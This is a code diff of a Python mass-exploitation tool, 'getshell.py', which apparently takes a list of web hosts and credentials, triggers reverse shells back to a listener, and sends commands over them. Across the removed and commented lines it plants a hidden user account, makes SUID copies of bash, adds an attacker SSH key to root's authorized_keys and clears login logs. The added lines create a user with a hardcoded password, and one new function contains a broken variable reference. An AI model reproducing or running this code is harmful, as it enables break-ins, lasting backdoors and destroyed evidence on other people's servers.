@@ -18,8 +18,8 @@ command = False
 input_file = ''
 output_file = ''
 '''add your diy name and pass'''
-user = 'xxxxx'
-pas = 'xxxxx'
+user = 'pangsec'
+pas = 'Pang@sec567'
 
 def usage():
     print("\n\nWelcome opang nc listen to get shell tools!")
@@ -39,9 +39,9 @@ def usage():
     print("-c --command         - initialize a command shell")
     print("-i --input           - input file path")
     print("-o --output          - output file path")
-    print("\n\n")
+    print("\n")
     print("Examples:")
-    print("python getshell.py -c -I 192.168.0.1 -p 5555 -i fofa_url.txt -o shell.txt")
+    print("python getshell.py -c -I 192.168.0.1 -p 5555 -i fofa_url.txt -o shell.txt\n")
     sys.exit(0)
 
 def getCookie(url,name, passwd):
@@ -79,17 +79,27 @@ def run_command(command):
         # send the output back to the client
         return output
 
+def print_command(conn):
+    while True:
+        try:
+            callback = conn.recv(1024)
+            if len(callable) != 0:
+                print(callback)
+        except:
+            print("Connect wrong")
+
+
 def client_handler(conn):
     if command:
-        # conn.send(bytes('echo "mcsql:$1$salt$RJlsx/yNfYcHxgK4Yta8l1:0:0::/root/:/bin/bash" >> /etc/passwd\n', encoding='utf-8'))
-        conn.send(bytes("userdel {}\n".format(user), encoding='utf-8'))
-        conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'salt' {}` {}\n".format(pas, user), encoding='utf-8'))
-        conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n', encoding='utf-8'))
-        conn.send(bytes('cp /bin/bash /etc/shell && chmod u+s /etc/shell\n', encoding='utf-8'))
-        conn.send(bytes('echo "AllowUsers {}" >> /etc/ssh/sshd_config && systemtcl restart sshd\n'.format(user), encoding='utf-8'))
-        conn.send(bytes('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOTdNGIBC2Mxh7jM5THYP8yEiJWFZarlh0xxv+KakDox89eX7l6/LhCPtzcJcTROfbJPRP6bwJlzuAvSrnehKgJYIHBUsPoXQ7rQCMAAqg4HcKr8tWY//IF+FJAB4/WrW8DLt9RU3GNesrW+Q6kWNPxOz4DMmCxrSfPe0TALvTTR0NUmUmQbozFVwzilQUe2ynapc7Y3ZNwqQyrlFLNuXhz9BlbNgR/0xEeTDRt7uF58CNrTTd4/oV2CCuwGAzeojkOJNr3/R7UTJhGobPsGBCFH7JSgTxeDrNSyPwMqL2UBtLo62gYXsGLPPO+dHt+4Ct3uAlecEALVMX2gT0oROzcT1+7qC/Vlr+5giC3BGRFkavn5HHdkvPYDTsV3+tqMR0HyP+HeluSdYgVib760sMp7qtX09ZP0YEV5WvnxLvBHPBhoNPxtpa0rbarsbB4rM0zKDVc4rO1zzYVRhyBy2w1XglDT1tKSrWJptFR95DOajjAjdBbWoqS5GUZfZiDLc= root@iZbp10h4i9vi90jtzblpsoZ" >> /root/.ssh/authorized_keys\n', encoding='utf-8'))
-        conn.send(bytes('echo > /var/log/btmp; echo > /var/log/wtmp; echo > /var/log/secure; cat /dev/null > /var/spool/mail/root\n', encoding='utf-8'))
-        conn.send(bytes('exit\n', encoding='utf-8'))
+        threading._start_new_thread(print_command, (conn,))
+        conn.send(bytes("adduser -H {};\n{};\n{};\n\n".format(user, pas, pas), encoding='utf-8'))
+        # conn.send(bytes("userdel {}\n\n".format(user), encoding='utf-8'))
+        # conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'KakDox89' {}` {}\n\n".format(pas, user), encoding='utf-8'))
+        # conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n\n', encoding='utf-8'))
+        # conn.send(bytes('cp /bin/bash /etc/shell && chmod u+s /etc/shell\n\n', encoding='utf-8'))
+        # conn.send(bytes('echo "AllowUsers {}" >> /etc/ssh/sshd_config && systemctl restart sshd\n\n'.format(user), encoding='utf-8'))
+        # conn.send(bytes('echo > /var/log/btmp; echo > /var/log/wtmp; echo > /var/log/secure; cat /dev/null > /var/spool/mail/root\n\n', encoding='utf-8'))
+        # conn.send(bytes('exit\n\n', encoding='utf-8'))
         print("get shell")
 
 def test_ssh(host, username, passwd):
@@ -113,34 +123,35 @@ def test_ssh(host, username, passwd):
         return [False, None, None]
 
 def send_loop(server):
-    while True:
-        conn, address = server.accept()
-        print("start attack!")
-        client_handler(conn)
-        # conn_thread = threading.Thread(target=client_handler, args=(conn,))
-        break
+    conn, address = server.accept()
+    print("start attack!")
+    client_handler(conn)
+    # conn_thread = threading.Thread(target=client_handler, args=(conn,))
 
 def loop():
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target, port))
-    server.listen(5)
+    server.listen(1)
     print("Listening...")
+    # get one info 
     iterm = LoadIter(input_file)
     for ip,rport,username,password in iterm:
+        print('========================')
         outputfile = open(output_file, "a")
         # start listen thread and then to getshell
         result_thread = threading.Thread(target=send_loop, args=(server,))
         result_thread.start()
         # send request payload pacage
-        while True:
-            try:
-                su = 0
-                su = ncwebshell('http://{ip}:{port}'.format(ip=ip,port=rport),username, password)
-                time.sleep(1)
-                if su == 200:
-                    break
-            except:
-                break
+        su = 0
+        # while True:
+        try:
+            su = ncwebshell('http://{ip}:{port}'.format(ip=ip,port=rport),username, password)
+            if su == 200:
+                print(su)
+        except:
+            print("su error!")
+                # break
         
         # if conn_thread.join():
         if su == 200:
@@ -149,9 +160,11 @@ def loop():
                 print("{}\t用户：{}\t密码：{}\tSUID提权 /etc/shell /tmp/shell".format(ip, user, pas))
             else:
                 print("ssh sign in false!")
-        time.sleep(3)
         outputfile.close()
+        print('========================')
+        break
     print("Done")
+    
     exit(0)
             
 class LoadIter(): # 使用迭代器读取url
